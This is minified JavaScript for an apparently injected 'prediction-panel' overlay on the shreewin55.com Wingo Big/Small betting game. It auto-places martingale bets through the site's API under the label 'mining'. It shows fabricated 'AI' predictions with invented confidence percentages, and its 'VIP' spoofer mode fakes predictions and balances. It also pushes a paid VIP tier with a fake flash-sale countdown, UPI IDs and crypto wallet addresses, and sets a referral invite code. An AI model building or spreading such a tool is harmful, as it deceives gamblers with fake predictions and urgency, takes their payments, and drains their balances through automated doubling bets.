  localStorage.removeItem(Ut);
}
var h = null,
  m = !1,
  r = !1,
  cn = 0;
function Di() {
  var n = C();
  return n && n.active;
}
function Bi() {
  return C();
}
async function hi(n, t, i) {
  if (r) return !1;
  var o = C();
  if (o && o.pendingResult) {
    if (
      (N("Previous bet still unverified. Checking result first...", "wait"),
      (r = !0),
      cn++,
      await Ti(o, cn),
      !r)
    )
      return !1;
  }
  var c = Math.max(1, Math.floor(n * 0.01));
  if (n < c * 7)
    return (
      N("Balance too low. Need at least ₹" + c * 7 + " to start.", "loss"),
      !1
    );
  if (t <= n)
    return (N("Target must be higher than current balance.", "loss"), !1);
  return (
    un(Ao(n, t, i)),
    (m = !1),
    (r = !0),
    cn++,
    N(
      "Started mining — ₹" +
        F(n) +
        " → ₹" +
        F(t) +
        (i ? " | Stop below ₹" + F(i) : ""),
      "active",
    ),
    fn(cn),
    !0
  );
}
function Ai() {
  var n = C();
  if (n && n.pendingResult) {
    ((m = !0), N("Stopping after current round finishes...", "wait"));
    return;
  }
  R("Stopped.");
}
function R(n) {
  if (((r = !1), (m = !1), h)) (clearTimeout(h), (h = null));
  var t = C();
  if (t)
    ((t.active = !1),
      un(t),
      N(
        n +
          " — " +
          t.stats.rounds +
          " rounds, " +
          t.stats.wins +
          "W/" +
          t.stats.losses +
          "L, P&L ₹" +
          F(t.stats.netPL),
        "active",
      ));
  else N(n, "active");
}
function V(n) {
  return n !== cn;
}
async function Ri() {
  var n = C();
  if (!n || !n.active) return !1;
  ((r = !0), (m = !1), cn++);
  var t = cn;
  if (
    (N("Picking up where we left off...", "wait"),
    n.pendingResult && n.lastBetPeriod)
  )
    (N("Checking last bet result...", "wait"), await Ti(n, t));
  if (V(t)) return !1;
  if (m) return (R("Stopped."), !1);
  if (((n = C()), n && n.active && r)) return (fn(t), !0);
  return !1;
}
async function Ti(n, t) {
  for (var i = 1; i <= Pn; i++) {
    if (V(t)) return;
    try {
      var o = await Mt(n.lastBetPeriod);
      if (V(t)) return;
      if (o && o.data && o.data.status !== void 0) {
        gi(n, o.data.status === !0, o.data.winAmount || 0);
        return;
      }
    } catch (c) {}
    if (
      (N("Checking result... attempt " + i + "/" + Pn, "wait"),
      await new Promise(function (c) {
        setTimeout(c, i * 3000);
      }),
      V(t))
    )
      return;
    if (((n = C()), !n || !n.active)) return;
  }
  R(
    "⚠️ Couldn't verify last bet after " +
      Pn +
      " tries. Please check your balance.",
  );
}
function gi(n, t, i) {
  ((n.pendingResult = !1), n.stats.rounds++);
  var o;
  if (t)
    ((o = F(i - n.lastBetAmount)),
      n.stats.wins++,
      (n.stats.netPL = F(n.stats.netPL + o)),
      (n.martingaleStep = 0));
  else
    ((o = -F(n.lastBetAmount)),
      n.stats.losses++,
      (n.stats.netPL = F(n.stats.netPL + o)),
      (n.martingaleStep =
        n.martingaleStep >= Ni.length - 1 ? 0 : n.martingaleStep + 1));
  return (
    un(n),
    Ro({
      sessionId: n.startedAt,
      period: n.lastBetPeriod,
      amount: n.lastBetAmount,
      side: n.lastBetSide,
      result: t ? "win" : "loss",
      net: o,
      time: Date.now(),
    }),
    { won: t, net: o }
  );
}
async function fn(n) {
  if (V(n)) return;
  var t = C();
  if (!t || !t.active) {
    r = !1;
    return;
  }
  try {
    var i = await Zi(Ln);
    if (V(n)) return;
    var o = Date.now(),
      c = i.current.endTime,
      l = c - o,
      p = i.current.issueNumber;
    if (l < 8000) {
      (N("Round ending soon, waiting for the next one...", "wait"),
        (h = setTimeout(function () {
          fn(n);
        }, l + 2000)));
      return;
    }
    var f = l - 8000;
    (N("Next round in " + Math.ceil(f / 1000) + "s...", "wait"),
      (h = setTimeout(function () {
        To(p, c, n);
      }, f)));
  } catch (u) {
    (N("Connection issue, retrying in 5s...", "loss"),
      (h = setTimeout(function () {
        fn(n);
      }, 5000)));
  }
}
async function To(n, t, i) {
  if (V(i)) return;
  var o = C();
  if (!o || !o.active) return;
  var c;
  try {
    c = await $t();
  } catch (q) {
    if ((N("Couldn't check balance, skipping this round.", "loss"), !V(i)))
      h = setTimeout(function () {
        fn(i);
      }, 5000);
    return;
  }
  if (V(i)) return;
  if (((o = C()), !o || !o.active)) return;
  var l = F(c.data.balance);
  if (
    ((window.__wg_balance = l),
    window.dispatchEvent(
      new CustomEvent("wg-balance", { detail: { balance: l } }),
    ),
    l >= F(o.targetBalance))
  ) {
    R("\uD83C\uDFAF Target reached! ₹" + l);
    return;
  }
  if (o.stopLoss && l <= F(o.stopLoss)) {
    R("\uD83D\uDED1 Balance dropped to ₹" + l + ", stopping.");
    return;
  }
  var p = Ni[o.martingaleStep] || 1,
    f = o.baseUnit * p;
  if (l < f) {
    if (o.martingaleStep > 0) {
      var u = o.martingaleStep;
      ((o.martingaleStep = 0),
        (f = o.baseUnit),
        un(o),
        N("Can't afford recovery bet, going back to ₹" + f + ".", "wait"));
    }
    if (l < f) {
      R("Not enough balance for the minimum bet (₹" + f + ").");
      return;
    }
  }
  if (o.martingaleStep === 0) {
    var w = F(o.targetBalance - l);
    if (f > w && w >= 1)
      ((f = Math.max(1, Math.ceil(w / 0.96))),
        N("Almost there — betting ₹" + f + " to finish.", "wait"));
  }
  if (o.stopLoss && F(l - f) < F(o.stopLoss)) {
    R(
      "\uD83D\uDED1 This bet would drop balance below ₹" +
        F(o.stopLoss) +
        ", stopping.",
    );
    return;
  }
  var S = "BigSmall_Big",
    W = "Big",
    M = 50,
    J = window.__wgSpoofer && window.__wgSpoofer.isVip();
  if (J) {
    var z = window.__wgSpoofer.predictNum(Ln, n);
    ((W = z >= 5 ? "Big" : "Small"),
      (S = z >= 5 ? "BigSmall_Big" : "BigSmall_Small"));
    var O = window.__wgSpoofer.getSettings();
    M = O ? O.accuracy : 70;
  } else
    try {
      var E = await Xi(Ln);
      if (V(i)) return;
      if (E && E.data && E.data.list) {
        var e = On(E.data.list);
        ((W = e.prediction),
          (M = e.confidence),
          (S = W === "Big" ? "BigSmall_Big" : "BigSmall_Small"));
      }
    } catch (q) {
      N("Couldn't load history, going with Big.", "wait");
    }
  if (V(i)) return;
  if (((o = C()), !o || !o.active)) return;
  if (m) {
    R("Stopped.");
    return;
  }
  var y =
    o.martingaleStep > 0 ? " (recovery " + (o.martingaleStep + 1) + "/3)" : "";
  (N("⚡ Placing ₹" + f + " on " + W + y + " — " + M + "% confident", "active"),
    (o.lastBetPeriod = n),
    (o.lastBetAmount = f),
    (o.lastBetSide = S),
    (o.pendingResult = !0),
    un(o));
  try {
    var v = await Pi(Ln, n, f, S);
    if (V(i)) return;
    if (v.code !== 0) {
      if (((o = C()), o)) ((o.pendingResult = !1), un(o));
      if (
        (N("Bet was rejected" + (v.msg ? ": " + v.msg : "") + ".", "loss"), m)
      ) {
        R("Stopped.");
        return;
      }
      h = setTimeout(function () {
        fn(i);
      }, 3000);
      return;
    }
  } catch (q) {
    if (
      (N(
        "Network issue while betting. Will check the result when the round ends.",
        "loss",
      ),
      V(i))
    )
      return;
    if (m) {
      if (
        (N(
          "Stop requested, but last bet is unverified. It will be checked on next start.",
          "wait",
        ),
        (r = !1),
        (m = !1),
        h)
      )
        (clearTimeout(h), (h = null));
      Ci();
      return;
    }
    h = setTimeout(
      function () {
        hn(n, 0, i);
      },
      Math.max(t - Date.now() + 3000, 2000),
    );
    return;
  }
  (N("Bet placed ✓ — waiting for result...", "wait"),
    (h = setTimeout(
      function () {
        hn(n, 0, i);
      },
      Math.max(t - Date.now() + 3000, 2000),
    )));
}
async function hn(n, t, i) {
  if (V(i)) return;
  var o = C();
  if (!o || !o.pendingResult || o.lastBetPeriod !== n) return;
  var c = !1,
    l = 0;
  try {
    var p = await Mt(n);
    if (V(i)) return;
    if (p && p.data && p.data.status !== void 0)
      ((c = p.data.status === !0), (l = p.data.winAmount || 0));
    else {
      if (t < Pn) {
        var f = Math.min(3000 * (t + 1), 15000);
        (N("Result not in yet, checking again...", "wait"),
          (h = setTimeout(function () {
            hn(n, t + 1, i);
          }, f)));
        return;
      }
      R("⚠️ Couldn't get the result. Please check your balance.");
      return;
    }
  } catch (W) {
    if (V(i)) return;
    if (t < Pn) {
      var f = Math.min(5000 * (t + 1), 15000);
      (N("Error checking result, trying again...", "loss"),
        (h = setTimeout(function () {
          hn(n, t + 1, i);
        }, f)));
      return;
    }
    R(
      "⚠️ Couldn't get the result after multiple tries. Please check your balance.",
    );
    return;
  }
  if (((o = C()), !o || !o.pendingResult || o.lastBetPeriod !== n)) return;
  var u = gi(o, c, l);
  if (u.won) N("✅ WON +₹" + u.net + " (payout ₹" + F(l) + ")", "win");
  else if (((o = C()), o.martingaleStep === 0))
    N("❌ Lost ₹" + F(-u.net) + " — resetting to base bet.", "loss");
  else
    N(
      "❌ Lost ₹" +
        F(-u.net) +
        " — doubling next bet (step " +
        (o.martingaleStep + 1) +
        "/3)",
      "loss",
    );
  try {
    var w = await $t();
    if (V(i)) return;
    var S = F(w.data.balance);
    ((window.__wg_balance = S),
      window.dispatchEvent(
        new CustomEvent("wg-balance", { detail: { balance: S } }),
      ),
      (o = C()),
      N(
        "\uD83D\uDCB0 Balance: ₹" +
          S +
          " | Profit: ₹" +
          F(o.stats.netPL) +
          " | " +
          o.stats.wins +
          "W/" +
          o.stats.losses +
          "L",
        "active",
      ));
  } catch (W) {}
  if (m) {
    R("Stopped.");
    return;
  }
  fn(i);
}
function en(n) {
  let t = n.querySelector("#btn-mining-back"),
    i = n.querySelector("#btn-mining-start"),
    o = n.querySelector("#mine-target-goal"),
    c = n.querySelector("#mine-stop-loss"),
    l = n.querySelector("#mine-current-bal"),
    p = n.querySelector("#mine-energy-count"),
    f = n.querySelector("#mine-console"),
    u = n.querySelector("#mining-energy-modal"),
    w = n.querySelector("#btn-energy-topup"),
    S = n.querySelector("#btn-energy-boost"),
    W = n.querySelector("#btn-energy-close"),
    M = n.querySelector("#btn-mining-history"),
    J = n.querySelector("#mining-history-modal"),
    z = n.querySelector("#btn-history-close"),
    O = n.querySelector("#btn-history-clear"),
    E = n.querySelector("#mining-history-list"),
    e = 0;
  if (p) p.textContent = e;
  let y = () => {
    let L = window.__wg_balance || 0;
    if (window.__wgSpoofer && window.__wgSpoofer.isVip())
      try {
        let P = JSON.parse(localStorage.getItem("wg_spoof_state"));
        if (P && P.balance !== null) L = P.balance;
      } catch (P) {}
    if (l) l.textContent = "₹" + Number(L).toFixed(2);
  };
  y();
  let v = (L, P) => {
      if (!f) return;
      let Y = document.createElement("div");
      ((Y.className = "console-line" + (P ? " " + P : "")),
        (Y.textContent = "[" + new Date().toLocaleTimeString() + "] " + L),
        f.appendChild(Y),
        (f.scrollTop = f.scrollHeight));
    },
    q = (L) => {
      if (!i) return;
      if (L) ((i.textContent = "Stop Mining"), i.classList.add("active"));
      else
        ((i.textContent = "Start Mining · 1 Energy"),
          i.classList.remove("active"));
    };
  if (
    (Ki(),
    Gi((L, P) => {
      v(L, P);
    }),
    Fi((L) => {
      if ((y(), L && !L.active)) {
        if ((q(!1), o)) o.disabled = !1;
        if (c) c.disabled = !1;
      }
    }),
    en._onBalance)
  )
    window.removeEventListener("wg-balance", en._onBalance);
  if (
    ((en._onBalance = () => y()),
    window.addEventListener("wg-balance", en._onBalance),
    t)
  )
    t.addEventListener("click", () => {
      let L = n.host;
      if (L && typeof L._setView === "function") L._setView("menu");
    });
  if (S)
    S.addEventListener("click", () => {
      if (((e = 1), p)) p.textContent = e;
      if (u) u.style.display = "none";
      v("Energy recharged — you're good to go.", "win");
    });
  if (w)
    w.addEventListener("click", () => {
      v("Paid energy is coming soon. Use the free option for now.", "wait");
    });
  if (W)
    W.addEventListener("click", () => {
      if (u) u.style.display = "none";
    });
  function a() {
    if (!E) return;
    E.innerHTML = "";
    var L = Wt();
    L.forEach(function (P) {
      var Y = document.createElement("div");
      Y.className = "hist-entry";
      var H = P.side === "BigSmall_Big" ? "BIG" : "SML";
      ((Y.innerHTML =
        '<span class="hist-side ' +
        P.side +
        '">' +
        H +
        "</span>" +
        '<span class="hist-amt">₹' +
        P.amount +
        '</span><span class="hist-net ' +
        P.result +
        '">' +
        (P.net >= 0 ? "+" : "") +
        "₹" +
        Math.abs(P.net).toFixed(2) +
        '</span><span class="hist-time">' +
        new Date(P.time).toLocaleTimeString() +
        "</span>"),
        E.appendChild(Y));
    });
  }
  if (M)
    M.addEventListener("click", () => {
      if ((a(), J)) J.style.display = "flex";
    });
  if (z)
    z.addEventListener("click", () => {
      if (J) J.style.display = "none";
    });
  if (O)
    O.addEventListener("click", () => {
      (Vi(), a());
    });
  if (i)
    i.addEventListener("click", async () => {
      if (Di()) {
        Ai();
        return;
      }
      var L = window.__wg_balance || 0,
        P = parseFloat(o ? o.value : "0") || 0,
        Y = parseFloat(c ? c.value : "0") || 0;
      if (P <= L) {
        v("Set a target higher than your current balance.", "loss");
        return;
      }
      if (Y && Y >= L) {
        v("Stop-loss must be lower than your current balance.", "loss");
        return;
      }
      if (f) f.innerHTML = "";
      if ((q(!0), o)) o.disabled = !0;
      if (c) c.disabled = !0;
      var H = await hi(L, P, Y);
      if (!H) {
        if ((q(!1), o)) o.disabled = !1;
        if (c) c.disabled = !1;
      }
    });
  (async () => {
    var L = await Ri();
    if (L) {
      if ((q(!0), o)) o.disabled = !0;
      if (c) c.disabled = !0;
      var P = Bi();
      if (P) {
        if (o) o.value = P.targetBalance;
        if (c && P.stopLoss) c.value = P.stopLoss;
      }
    }
  })();
}
var A = {
  upi: ["upflastkismat@ptyes", "adrenox1@ybl", "anthropic1@upi"],
  crypto: {
    trc20: "TEQzuoAUiBEP8i5H1QhUBvKgGkJmFV3hVN",
    bep20: "0x30c139ADe43773B96B2Fb344A2c317de6C564058",
  },
  amount: 1499,
  originalAmount: 2399,
  flashDurationMs: 7200000,
  flashTimerKey: "vip_flash_sale_end_v1",
  cryptoAmountUsd: 24,
};
var qn,
  An,
  Rn = 0;
function bi() {
  try {
    let n = parseInt(localStorage.getItem(A.flashTimerKey) || "0");
    if (n) return n;
    let t = Date.now() + A.flashDurationMs;
    return (localStorage.setItem(A.flashTimerKey, t.toString()), t);
  } catch (n) {
    return Date.now() + A.flashDurationMs;
  }
}
function xi(n) {
  let t = Math.max(0, n - Date.now()),
    i = Math.floor(t / 3600000)
      .toString()
      .padStart(2, "0"),
    o = Math.floor((t % 3600000) / 60000)
      .toString()
      .padStart(2, "0"),
    c = Math.floor((t % 60000) / 1000)
      .toString()
      .padStart(2, "0");
  return { text: `${i}:${o}:${c}`, done: t <= 0 };
}
function Io(n) {
  if (An) clearInterval(An);
  let t = bi(),
    i = () => {
      let o = xi(t);
      if (
        (n
          .querySelectorAll("[data-vip-flash-timer]")
          .forEach((c) => (c.textContent = o.text)),
        o.done)
      )
        clearInterval(An);
    };
  if ((i(), t > Date.now())) An = setInterval(i, 1000);
}
sessionStorage.setItem("invitecode", "37677121480");
var jo = "https://api.shreewinapi.com",
  mo = "Account unavailable. Please create a new account.",
  bo = "/#/register?invitationCode=37677121480",
  xo = "/#/wallet/Recharge",
  ro = "shreewin55.com".includes("okwin") ? "light" : "dark",
  Ii = "";
function s(n) {
  let t = String(n == null ? "" : n).trim();
  return /^\d{8,22}$/.test(t) ? t : "";
}
function ji(n) {
  if (((n = s(n)), !n)) return "";
  try {
    return (BigInt(n) + 1n).toString();
  } catch (t) {
    return "";
  }
}
function ko(n, t) {
  if (((n = s(n)), (t = s(t)), !n || !t)) return 0;
  try {
    let i = BigInt(n),
      o = BigInt(t);
    return i > o ? 1 : i < o ? -1 : 0;
  } catch (i) {
    return n > t ? 1 : n < t ? -1 : 0;
  }
}
function _o(n, t, i) {
  let o = n.querySelector("#pred-history");
  if (!o) return;
  let c = (i || []).slice(0, 8),
    l = s(c[0]?.issueNumber ?? c[0]?.issue),
    p = t + ":" + l + ":" + c.map((w) => w.number || w.num || w).join(",");
  if (p === Ii) return;
  Ii = p;
  let f = document.createDocumentFragment(),
    u = document.createElement("span");
  if (
    ((u.className = "hist-label"),
    (u.textContent = "Recent"),
    f.appendChild(u),
    c.length < 2)
  ) {
    (o.replaceChildren(f), (o.style.display = "none"));
    return;
  }
  (c.forEach((w) => {
    let S = parseInt(w.number || w.num || w),
      W = document.createElement("span");
    ((W.className = "hist-dot " + (S >= 5 ? "big" : "small")),
      (W.title = (S >= 5 ? "Big" : "Small") + ": " + S),
      f.appendChild(W));
  }),
    o.replaceChildren(f),
    (o.style.display = "flex"));
}
function so(n, t) {
  let i = n.querySelector("#streak-badge"),
    o = n.querySelector("#streak-text");
  if (!i || !o) return;
  if (t.streak && t.streak.len >= 3)
    ((o.textContent = t.streak.len + "× " + t.streak.side),
      (i.style.display = "flex"));
  else i.style.display = "none";
}
var mi = "";
function ri() {
  let n = document.querySelector("prediction-panel")?.shadowRoot;
  if (!n) return;
  let t = lt(),
    i = Vn(),
    o = ci(),
    c = window.__wgSpoofer,
    l = c && c.isVip();
  if (!t.length && !(l && i && s(o))) {
    (tn("loading"), on(), ui());
    return;
  }
  let p = s(t[0]?.issueNumber ?? t[0]?.issue),
    f = s(o);
  if (p && (!f || ko(f, p) <= 0)) f = ji(p);
  let u = s(fi());
  if (u && f && ji(u) !== f) {
    tn("loading");
    return;
  }
  let w = [
    i,
    p,
    f,
    t
      .slice(0, 8)
      .map((e) => e.number || e.num || e)
      .join(","),
  ].join("|");
  if (w === mi) {
    tn("result");
    return;
  }
  mi = w;
  let S;
  if (l && i && f) {
    let e = c.predictNum(i, f),
      y = e === 0 || e === 5 ? "violet" : e % 2 === 0 ? "red" : "green";
    S = {
      prediction: e >= 5 ? "Big" : "Small",
      confidence: 73 + ((e * 7 + 3) % 22),
      color: y,
      topNumber: e,
      signals: [],
      heatmap: { hot: [], cold: [] },
      streak: null,
    };
  }
  if (!S) S = On(t);
  let W = S.prediction === "Big",
    M = n.querySelector("#pred-pill");
  ((M.textContent = S.prediction),
    (M.className = "pred-size " + (W ? "big" : "small")));
  let J = n.querySelector("#pred-color");
  ((J.textContent = S.color.charAt(0).toUpperCase() + S.color.slice(1)),
    (J.className = "pred-color " + S.color));
  let z = S.topNumber ?? S.heatmap?.hot?.[0] ?? 0;
  ((n.querySelector("#hero-ball").style.backgroundImage =
    "url('" + ni(z) + "')"),
    (n.querySelector("#pred-glow").className =
      "pred-glow " + (W ? "big" : "small")),
    (n.querySelector("#pro-card").className =
      "pro-card c-" + (W ? "big" : "small")));
  let O = n.querySelector("#conf-fill");
  ((O.style.width = S.confidence + "%"),
    (O.className = "conf-fill" + (W ? "" : " small")),
    (n.querySelector("#conf-pct").textContent = S.confidence + "%"),
    _o(n, i, t));
  let E = n.querySelector("#pro-period");
  if (E && f) E.textContent = "#" + f.slice(-6);
  (so(n, S),
    n.querySelector("#pro-prediction").classList.toggle("vip-mode", !!l),
    tn("result"));
}
Zt({
  apiBase: jo,
  spoofDomain: "shreewin55.com",
  minBalance: 500,
  nukeUrl: bo,
  authErrMsg: mo,
  onBalance: (n) => {
    window.__wg_balance = n;
  },
  onWingo: (n, t) => yi(n, t),
});
jt();
ei({ onPred: ri });
if (!customElements.get("prediction-panel"))
  customElements.define(
    "prediction-panel",
    class extends HTMLElement {
      connectedCallback() {
        if (!document.querySelector("link[data-wg-font]")) {
          let M = document.createElement("link");
          ((M.rel = "stylesheet"),
            (M.href =
              "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"),
            (M.dataset.wgFont = "1"),
            document.head.appendChild(M));
        }
        ((this._mode = "logo"), this.classList.add(ro));
        let n = this.attachShadow({ mode: "open" });
        ((n.innerHTML = `
<style>
  :host {
    position: fixed;
    z-index: 2147483647;
    touch-action: none;
    user-select: none;
    --f: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    --ease: cubic-bezier(0.4, 0, 0.2, 1);
    --panel-bg: linear-gradient(
      155deg,
      rgba(11, 9, 30, 0.98) 0%,
      rgba(20, 16, 50, 0.97) 100%
    );
    --panel-border: rgba(139, 92, 246, 0.22);
    --panel-shadow:
      0 24px 64px rgba(0, 0, 0, 0.75), 0 0 0 1px rgba(255, 255, 255, 0.06),
      0 0 100px rgba(99, 60, 220, 0.08);
    --hdr-bg: rgba(255, 255, 255, 0.03);
    --hdr-border: rgba(255, 255, 255, 0.07);
    --t-title: #f1f0ff;
    --t-name: #f1f0ff;
    --t-body: rgba(255, 255, 255, 0.52);
    --t-dim: rgba(255, 255, 255, 0.25);
    --x-bg: rgba(255, 255, 255, 0.07);
    --x-col: rgba(255, 255, 255, 0.32);
    --x-bg-h: rgba(255, 255, 255, 0.14);
    --x-col-h: rgba(255, 255, 255, 0.8);
    --card-bg: rgba(255, 255, 255, 0.035);
    --card-bdr: rgba(255, 255, 255, 0.07);
    --back-bg: rgba(255, 255, 255, 0.06);
    --back-bdr: rgba(255, 255, 255, 0.09);
    --back-col: rgba(255, 255, 255, 0.5);
    --back-col-h: rgba(255, 255, 255, 0.9);
    --back-bdr-h: rgba(139, 92, 246, 0.5);
    --pro: #8b5cf6;
    --pro-lt: rgba(139, 92, 246, 0.14);
    --pro-glow: rgba(139, 92, 246, 0.2);
    --pro-txt: #c4b5fd;
    --pro-bdr-h: rgba(139, 92, 246, 0.45);
    --vip: #f59e0b;
    --vip-lt: rgba(245, 158, 11, 0.13);
    --vip-glow: rgba(245, 158, 11, 0.2);
    --vip-txt: #fde68a;
    --vip-bdr-h: rgba(245, 158, 11, 0.45);
    --mine: #10b981;
    --mine-lt: rgba(16, 185, 129, 0.14);
    --mine-glow: rgba(16, 185, 129, 0.2);
    --mine-txt: #a7f3d0;
    --mine-bdr-h: rgba(16, 185, 129, 0.45);
    --upi: #06b6d4;
    --upi-lt: rgba(6, 182, 212, 0.14);
    --upi-glow: rgba(6, 182, 212, 0.2);
    --upi-txt: #a5f3fc;
    --upi-bdr-h: rgba(6, 182, 212, 0.45);
    --crypto: #eab308;
    --crypto-lt: rgba(234, 179, 8, 0.13);
    --crypto-glow: rgba(234, 179, 8, 0.2);
    --crypto-txt: #fef08a;
    --crypto-bdr-h: rgba(234, 179, 8, 0.45);
    --pc-bg: linear-gradient(
      150deg,
      rgba(20, 16, 52, 0.94) 0%,
      rgba(12, 10, 34, 0.97) 100%
    );
    --pc-bdr: rgba(139, 92, 246, 0.16);
    --pc-shad:
      0 10px 36px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(139, 92, 246, 0.1);
    --tw-bg: rgba(255, 255, 255, 0.04);
    --tw-bdr: rgba(255, 255, 255, 0.07);
    --big: #feaa57;
    --small: #6ea8f4;
    --strip: rgba(255, 255, 255, 0.07);
    --live: #34d399;
    --gate-title: #f1f0ff;
    --gate-bal-bg: rgba(139, 92, 246, 0.12);
    --gate-bal-col: #c4b5fd;
    --gate-bal-bdr: rgba(139, 92, 246, 0.22);
    --stat-bg: rgba(255, 255, 255, 0.03);
    --stat-bdr: rgba(255, 255, 255, 0.07);
    --chev: rgba(255, 255, 255, 0.15);
    --chip-bg: rgba(255, 255, 255, 0.07);
    --chip-bdr: rgba(255, 255, 255, 0.1);
    --chip-col: rgba(255, 255, 255, 0.7);
    --chip-hash: rgba(255, 255, 255, 0.42);
  }
  :host(.light) {
    --panel-bg: linear-gradient(155deg, #ffffff 0%, #fff8f8 100%);
    --panel-border: rgba(249, 89, 89, 0.18);
    --panel-shadow:
      0 16px 52px rgba(180, 30, 30, 0.14), 0 0 0 1px rgba(249, 89, 89, 0.12),
      0 4px 16px rgba(0, 0, 0, 0.06);
    --hdr-bg: linear-gradient(100deg, #f95959 0%, #ff8080 100%);
    --hdr-border: transparent;
    --t-title: #1f1f2e;
    --t-name: #1f1f2e;
    --t-body: #6b7280;
    --t-dim: rgba(0, 0, 0, 0.3);
    --x-bg: rgba(255, 255, 255, 0.22);
    --x-col: rgba(255, 255, 255, 0.85);
    --x-bg-h: rgba(255, 255, 255, 0.36);
    --x-col-h: #fff;
    --card-bg: rgba(0, 0, 0, 0.022);
    --card-bdr: rgba(0, 0, 0, 0.08);
    --back-bg: rgba(0, 0, 0, 0.04);
    --back-bdr: rgba(0, 0, 0, 0.1);
    --back-col: #6b7280;
    --back-col-h: #1f1f2e;
    --back-bdr-h: rgba(224, 60, 60, 0.4);
    --pro: #e03c3c;
    --pro-lt: rgba(224, 60, 60, 0.08);
    --pro-glow: rgba(224, 60, 60, 0.14);
    --pro-txt: #c0392b;
    --pro-bdr-h: rgba(224, 60, 60, 0.4);
    --vip: #d97706;
    --vip-lt: rgba(217, 119, 6, 0.08);
    --vip-glow: rgba(217, 119, 6, 0.13);
    --vip-txt: #b45309;
    --vip-bdr-h: rgba(217, 119, 6, 0.4);
    --mine: #059669;
    --mine-lt: rgba(5, 150, 105, 0.08);
    --mine-glow: rgba(5, 150, 105, 0.13);
    --mine-txt: #047857;
    --mine-bdr-h: rgba(5, 150, 105, 0.4);
    --upi: #0891b2;
    --upi-lt: rgba(8, 145, 178, 0.08);
    --upi-glow: rgba(8, 145, 178, 0.13);
    --upi-txt: #0e7490;
    --upi-bdr-h: rgba(8, 145, 178, 0.4);
    --crypto: #ca8a04;
    --crypto-lt: rgba(202, 138, 4, 0.08);
    --crypto-glow: rgba(202, 138, 4, 0.13);
    --crypto-txt: #854d0e;
    --crypto-bdr-h: rgba(202, 138, 4, 0.4);
    --pc-bg: linear-gradient(150deg, #ffffff 0%, #f9f0ff 100%);
    --pc-bdr: rgba(224, 60, 60, 0.14);
    --pc-shad:
      0 6px 24px rgba(0, 0, 0, 0.08), 0 0 0 1px rgba(224, 60, 60, 0.08);
    --tw-bg: rgba(0, 0, 0, 0.025);
    --tw-bdr: rgba(0, 0, 0, 0.08);
    --strip: rgba(0, 0, 0, 0.07);
    --gate-title: #111827;
    --gate-bal-bg: rgba(220, 38, 38, 0.07);
    --gate-bal-col: #dc2626;
    --gate-bal-bdr: rgba(220, 38, 38, 0.14);
    --stat-bg: rgba(0, 0, 0, 0.025);
    --stat-bdr: rgba(0, 0, 0, 0.07);
    --chev: rgba(0, 0, 0, 0.14);
    --chip-bg: rgba(249, 89, 89, 0.08);
    --chip-bdr: rgba(249, 89, 89, 0.16);
    --chip-col: #374151;
    --chip-hash: #9ca3af;
  }
  .logo {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    overflow: hidden;
    cursor: grab;
    display: block;
    transition:
      box-shadow 0.22s,
      transform 0.22s;
    box-shadow:
      0 4px 20px rgba(0, 0, 0, 0.45),
      0 0 0 2.5px rgba(255, 255, 255, 0.15),
      0 0 0 5px rgba(139, 92, 246, 0.08);
  }
  .logo:hover {
    box-shadow:
      0 6px 26px rgba(0, 0, 0, 0.55),
      0 0 0 2.5px rgba(255, 255, 255, 0.25),
      0 0 0 6px rgba(139, 92, 246, 0.14);
    transform: scale(1.06);
  }
  .logo.dragging {
    cursor: grabbing;
    transform: scale(0.93);
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
  }
  .logo img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    pointer-events: none;
  }
  :host(.light) .logo {
    box-shadow:
      0 4px 18px rgba(200, 50, 50, 0.3),
      0 0 0 2.5px rgba(249, 89, 89, 0.28),
      0 0 0 5px rgba(249, 89, 89, 0.1);
  }
  :host(.light) .logo:hover {
    box-shadow:
      0 6px 24px rgba(200, 50, 50, 0.4),
      0 0 0 2.5px rgba(249, 89, 89, 0.4),
      0 0 0 6px rgba(249, 89, 89, 0.14);
  }
  :host([data-route="other"]) .logo,
  :host([data-route="other"]) .panel {
    display: none !important;
  }
  .panel {
    display: none;
    width: min(86vw, 288px);
    border-radius: 20px;
    overflow: hidden;
    background: var(--panel-bg);
    border: 1px solid var(--panel-border);
    box-shadow: var(--panel-shadow);
    backdrop-filter: blur(36px);
    -webkit-backdrop-filter: blur(36px);
    font-family: var(--f);
  }
  .panel.active {
    display: block;
    animation: panelIn 0.22s var(--ease);
  }
  @keyframes panelIn {
    from {
      opacity: 0;
      transform: scale(0.91) translateY(8px);
    }
    to {
      opacity: 1;
      transform: scale(1) translateY(0);
    }
  }
  .panel-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 11px 13px;
    cursor: grab;
    background: var(--hdr-bg);
    border-bottom: 1px solid var(--hdr-border);
  }
  .panel-header.dragging {
    cursor: grabbing;
  }
  .panel-title {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.1px;
  }
  :host(.light) .panel-title {
    color: #fff;
  }
  .panel-title img {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    box-shadow: 0 1px 6px rgba(0, 0, 0, 0.25);
    cursor: pointer;
    touch-action: manipulation;
    position: relative;
    z-index: 1;
  }
  .brand-pw {
    font-size: 14px;
    font-weight: 800;
    letter-spacing: 0.2px;
    color: #fff;
    position: relative;
    display: inline-flex;
    align-items: baseline;
  }
  .pw-in {
    position: relative;
    display: inline-block;
  }
  .pw-i {
    position: relative;
    display: inline-block;
  }
  .pw-star {
    position: absolute;
    top: 2px;
    left: 50%;
    transform: translateX(-50%);
    width: 8px;
    height: 8px;
    color: #facc15;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.2));
  }
  .pw-smile {
    position: absolute;
    bottom: -2px;
    left: 50%;
    transform: translateX(-45%);
    width: 16px;
    height: 6px;
    stroke: #fff;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.15));
  }
  .ai-badge {
    padding: 1px 5px;
    border-radius: 4px;
    font-size: 8.5px;
    font-weight: 700;
    letter-spacing: 0.8px;
    background: transparent;
    border: 1px solid rgba(255, 255, 255, 0.35);
    color: rgba(255, 255, 255, 0.8);
    line-height: 1.5;
  }
  :host(.light) .ai-badge {
    border-color: rgba(255, 255, 255, 0.5);
